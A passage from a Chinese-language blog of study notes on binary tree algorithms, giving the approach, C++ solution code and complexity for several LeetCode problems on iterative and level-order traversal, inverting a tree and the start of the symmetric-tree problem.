<span class="keyword">if</span> (node-&gt;left) st.<span class="built_in">push</span>(node-&gt;left);             <span class="comment">// 左（空节点不入栈）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p><strong>后续遍历</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;<span class="comment">//栈</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> result;</span><br><span class="line">        st.<span class="built_in">push</span>(root);<span class="comment">//根节点开始访问</span></span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            result.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left) st.<span class="built_in">push</span>(node-&gt;left); <span class="comment">// 相对于前序遍历，这更改一下入栈顺序 （空节点不入栈）</span></span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right) st.<span class="built_in">push</span>(node-&gt;right); <span class="comment">// 空节点不入栈</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>()); <span class="comment">// 将结果反转之后就是左右中的顺序了</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="3-2-leetcode-94-中序遍历-E"><a href="#3-2-leetcode-94-中序遍历-E" class="headerlink" title="3.2 leetcode-94-中序遍历-E"></a>3.2 leetcode-94-中序遍历-E</h2><ul>
<li>中序 — 左中右</li>
<li>先访问根节点 —入栈 一直访问左节点 直到叶子节点 弹出保存在数组</li>
<li>然后访问上一个节点的右子节点</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        TreeNode* cur = root;<span class="comment">//根节点</span></span><br><span class="line">        <span class="comment">//循环条件 节点不为空 或 栈不为空   注意是或！！！！！   </span></span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">NULL</span> || !st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur != <span class="literal">NULL</span>) &#123; <span class="comment">// 指针来访问节点，访问到最底层</span></span><br><span class="line">                st.<span class="built_in">push</span>(cur); <span class="comment">// 将访问的节点放进栈</span></span><br><span class="line">                cur = cur-&gt;left;                <span class="comment">// 左</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = st.<span class="built_in">top</span>(); <span class="comment">// 从栈里弹出的数据，就是要处理的数据（放进result数组里的数据）</span></span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                result.<span class="built_in">push_back</span>(cur-&gt;val);     <span class="comment">// 中</span></span><br><span class="line">                cur = cur-&gt;right;               <span class="comment">// 右 节点迭代</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="4-二叉树的层序遍历"><a href="#4-二叉树的层序遍历" class="headerlink" title="4.二叉树的层序遍历"></a>4.二叉树的层序遍历</h1><p>相当于图论—广度优先搜索</p>
<h2 id="4-1-leetcode-102-二叉树的层序遍历-M"><a href="#4-1-leetcode-102-二叉树的层序遍历-M" class="headerlink" title="4.1 leetcode-102-二叉树的层序遍历-M"></a>4.1 leetcode-102-二叉树的层序遍历-M</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/description/">102. 二叉树的层序遍历 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>借助队列，并记录每一层元素的大小——-控制队列弹出的数量</li>
<li>定义一个一维数组放入每一层的元素</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);<span class="comment">//根结点 不为空</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();<span class="comment">// 每一层的大小</span></span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; vec;            <span class="comment">//记录每一层</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(vec);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 每个元素仅进出队列一次</li>
<li>空间复杂度：O(n) 数组</li>
</ul>
<h2 id="4-2-leetcode-107-层序遍历Ⅱ-M"><a href="#4-2-leetcode-107-层序遍历Ⅱ-M" class="headerlink" title="4.2 leetcode-107-层序遍历Ⅱ-M"></a>4.2 leetcode-107-层序遍历Ⅱ-M</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal-ii/description/">107. 二叉树的层序遍历 II - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>对上述最终结果进行反转reverse</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrderBottom</span>(TreeNode* root) &#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//固定值</span></span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node -&gt; right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(vec);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(n)</li>
</ul>
<h2 id="4-3-leetcode-199-二叉树的右视图"><a href="#4-3-leetcode-199-二叉树的右视图" class="headerlink" title="4.3 leetcode-199-二叉树的右视图"></a>4.3 leetcode-199-二叉树的右视图</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/binary-tree-right-side-view/description/">199. 二叉树的右视图 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>返回右侧能看到的节点值</li>
<li>层序遍历的时候判断<strong>是否遍历到单层的最后面元素</strong>，如果是就放入res数组中</li>
<li>因为最右边的元素就是每一层的最后元素</li>
<li>下面的情况应该特别注意条件判断</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231023113254445.png" alt="image-20231023113254445"></li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rightSideView</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//固定值</span></span><br><span class="line">            <span class="comment">//vector&lt;int&gt; vec;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="comment">//res.push_back(node-&gt;val);</span></span><br><span class="line">                <span class="keyword">if</span> (i == (size - <span class="number">1</span>)) res.<span class="built_in">push_back</span>(node-&gt;val);<span class="comment">//将每一层最后元素放入res</span></span><br><span class="line">                <span class="comment">//i用来追踪当前遍历的节点在当前层中的位置 ，size是当前层的节点数，那么最后一个节点位置就是size-1</span></span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node -&gt; right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//res.push_back(vec);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<p>同上</p>
<h2 id="4-4-leetcode-637-二叉树的层平均值-E"><a href="#4-4-leetcode-637-二叉树的层平均值-E" class="headerlink" title="4.4 leetcode-637-二叉树的层平均值-E"></a>4.4 leetcode-637-二叉树的层平均值-E</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/average-of-levels-in-binary-tree/description/">637. 二叉树的层平均值 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>返回层平均值</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);<span class="comment">//根结点 不为空</span></span><br><span class="line">        vector&lt;<span class="type">double</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();<span class="comment">// 每一层的大小</span></span><br><span class="line">            <span class="type">double</span> avrage = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                avrage += node-&gt;val;</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            avrage = avrage / size;</span><br><span class="line">            res.<span class="built_in">push_back</span>(avrage);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<p>同上</p>
<h2 id="4-5-leetcode-429-N叉树的层序遍历-M"><a href="#4-5-leetcode-429-N叉树的层序遍历-M" class="headerlink" title="4.5 leetcode-429-N叉树的层序遍历-M"></a>4.5 leetcode-429-N叉树的层序遍历-M</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/n-ary-tree-level-order-traversal/description/">429. N 叉树的层序遍历 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>从左到右，节点有多个孩子</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(Node* root) &#123;</span><br><span class="line">        queue&lt;Node*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);<span class="comment">//根结点 不为空</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();<span class="comment">// 每一层的大小</span></span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                Node* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; node-&gt;children.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (node-&gt;children[j]) que.<span class="built_in">push</span>(node-&gt;children[j]);<span class="comment">//如果存在多个孩子则将多个孩子放入</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//if (node-&gt;right) que.push(node-&gt;right);</span></span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(vec);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<p>同上</p>
<h2 id="4-6-leetcode-515-在每个树行中找最大值-M"><a href="#4-6-leetcode-515-在每个树行中找最大值-M" class="headerlink" title="4.6 leetcode-515-在每个树行中找最大值-M"></a>4.6 leetcode-515-在每个树行中找最大值-M</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/find-largest-value-in-each-tree-row/description/">515. 在每个树行中找最大值 - 力扣（LeetCode）</a></p>
<p><strong>思路</strong></p>
<ul>
<li>找出每层最大值即可</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">largestValues</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);<span class="comment">//根结点 不为空</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();<span class="comment">// 每一层的大小</span></span><br><span class="line">            <span class="type">int</span> maxNum = INT_MIN; <span class="comment">//先设置为最小值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;val &gt; maxNum) maxNum = node-&gt;val; <span class="comment">//如果大于则进行替换</span></span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(maxNum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<p>同上</p>
<h2 id="4-7-leetcode-116-填充每个节点的下一个右侧节点指针-M"><a href="#4-7-leetcode-116-填充每个节点的下一个右侧节点指针-M" class="headerlink" title="4.7 leetcode-116-填充每个节点的下一个右侧节点指针-M"></a>4.7 leetcode-116-填充每个节点的下一个右侧节点指针-M</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node/description/">116. 填充每个节点的下一个右侧节点指针 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>给定完美二叉树</li>
<li>填充每个next指针使他指向右侧节点<ul>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231024100330393.png" alt="image-20231024100330393"></li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;Node*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="comment">// vector&lt;int&gt; vec;</span></span><br><span class="line">            Node* nodePre;<span class="comment">//前一个节点</span></span><br><span class="line">            Node* node;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                    nodePre = que.<span class="built_in">front</span>(); <span class="comment">// 取出一层的头结点</span></span><br><span class="line">                    que.<span class="built_in">pop</span>();</span><br><span class="line">                    node = nodePre;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    node = que.<span class="built_in">front</span>();</span><br><span class="line">                    que.<span class="built_in">pop</span>();</span><br><span class="line">                    nodePre-&gt;next = node; <span class="comment">// 本层前一个节点next指向本节点</span></span><br><span class="line">                    nodePre = nodePre-&gt;next; <span class="comment">//迭代</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            nodePre-&gt;next = <span class="literal">NULL</span>; <span class="comment">// 本层最后一个节点指向NULL</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<p>同上</p>
<h2 id="4-8-leetcode-117-填充每个节点的下一个右节点指针Ⅱ-M"><a href="#4-8-leetcode-117-填充每个节点的下一个右节点指针Ⅱ-M" class="headerlink" title="4.8 leetcode-117-填充每个节点的下一个右节点指针Ⅱ-M"></a>4.8 leetcode-117-填充每个节点的下一个右节点指针Ⅱ-M</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/description/">117. 填充每个节点的下一个右侧节点指针 II - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>不是完美二叉树了 但是代码不用改 上面的就能用】</li>
</ul>
<h2 id="4-9-leetcode-107-二叉树的最大深度-E"><a href="#4-9-leetcode-107-二叉树的最大深度-E" class="headerlink" title="4.9 leetcode-107-二叉树的最大深度-E"></a>4.9 leetcode-107-二叉树的最大深度-E</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/description/">104. 二叉树的最大深度 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>就是统计层数</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);<span class="comment">//根结点 不为空</span></span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();<span class="comment">// 每一层的大小</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>







<h2 id="4-10-leetcode-111-二叉树的最小深度-E"><a href="#4-10-leetcode-111-二叉树的最小深度-E" class="headerlink" title="4.10 leetcode-111-二叉树的最小深度-E"></a>4.10 leetcode-111-二叉树的最小深度-E</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/minimum-depth-of-binary-tree/description/">111. 二叉树的最小深度 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>左右子节点都为空才是</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);<span class="comment">//根结点 不为空</span></span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();<span class="comment">// 每一层的大小</span></span><br><span class="line">            res++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                <span class="keyword">if</span> (!node-&gt;left &amp;&amp; !node-&gt;right) <span class="keyword">return</span> res;<span class="comment">//左右节点都为空时才返回 才是最短</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h1 id="5-leetcode-226-反转二叉树-E"><a href="#5-leetcode-226-反转二叉树-E" class="headerlink" title="5.leetcode-226-反转二叉树-E"></a>5.leetcode-226-反转二叉树-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/invert-binary-tree/description/">226. 翻转二叉树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>交换指针 不是交换数值 递归</li>
<li>前序（中 左 右）或者后序  </li>
<li>交换节点的两个孩子</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231024105944752.png" alt="image-20231024105944752"></li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="comment">//交换 中左右</span></span><br><span class="line">        <span class="built_in">swap</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">        <span class="built_in">invertTree</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">invertTree</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 遍历每一个节点</li>
<li>空间复杂度：O(n) 递归开辟栈</li>
</ul>
<h1 id="6-leetcode-101-对称二叉树-E"><a href="#6-leetcode-101-对称二叉树-E" class="headerlink" title="6.leetcode-101-对称二叉树-E"></a>6.leetcode-101-对称二叉树-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/symmetric-tree/description/">101. 对称二叉树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>检查二叉树是否轴对称</li>
<li>二叉树类的题目关键是<strong>确定遍历顺序</strong>———本体只能使用后续：左右中</li>
<li>后序遍历： 需要收集孩子的信息向上级反馈</li>
<li>递归三部曲：函数返回值，参数、截止条件、递归遍历顺序</li>
</ul>
<p><strong>代码实现</strong></p>
